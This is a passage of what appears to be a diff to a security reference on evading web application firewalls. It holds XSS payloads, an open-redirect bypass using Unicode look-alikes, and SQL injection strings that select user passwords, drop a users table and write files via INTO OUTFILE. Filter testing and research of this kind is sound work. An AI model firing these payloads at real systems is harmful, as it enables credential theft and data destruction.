@@ -2334,7 +2334,7 @@ __Obfuscated__: `<marquee onstart=\u0070r\u06f\u006dpt()>`
 __Blocked__: `/?redir=http://google.com`  
 __Bypassed__: `/?redir=http://google。com` (Unicode alternative) 
 
-__Blocked__: `<marquee loop=1 onfinish=alert()>x`
+__Blocked__: `<marquee loop=1 onfinish=alert()>x`  
 __Bypassed__: `＜marquee loop＝1 onfinish＝alert︵1)>x` (Unicode alternative)
 > __TIP:__ Have a look at [this](https://hackerone.com/reports/231444) and [this](https://hackerone.com/reports/231389) reports on HackerOne. :)
 
@@ -2475,12 +2475,12 @@ __13. Token Breakers__
 - Token breakers are symbols that allow affecting the correspondence between an element of a string and a certain token, and thus bypass search by signature.
 - However, the request must still remain valid while using token-breakers.
 
-__Case__: Unknown Token for the Tokenizer  
-__Payload__: `?id=‘-sqlite_version() UNION SELECT password FROM users --`  
+- __Case__: Unknown Token for the Tokenizer  
+    - __Payload__: `?id=‘-sqlite_version() UNION SELECT password FROM users --`  
 
-__Case__: Unknown Context for the Parser (Notice the uncontexted bracket)  
-__Payload 1__: `?id=123);DROP TABLE users --`  
-__Payload 2__: `?id=1337) INTO OUTFILE ‘xxx’ --`  
+- __Case__: Unknown Context for the Parser (Notice the uncontexted bracket)  
+    - __Payload 1__: `?id=123);DROP TABLE users --`  
+    - __Payload 2__: `?id=1337) INTO OUTFILE ‘xxx’ --`  
 
 > __TIP:__ More payloads can be crafted via this [cheat sheet](https://github.com/attackercan/cpp-sql-fuzzer).
 
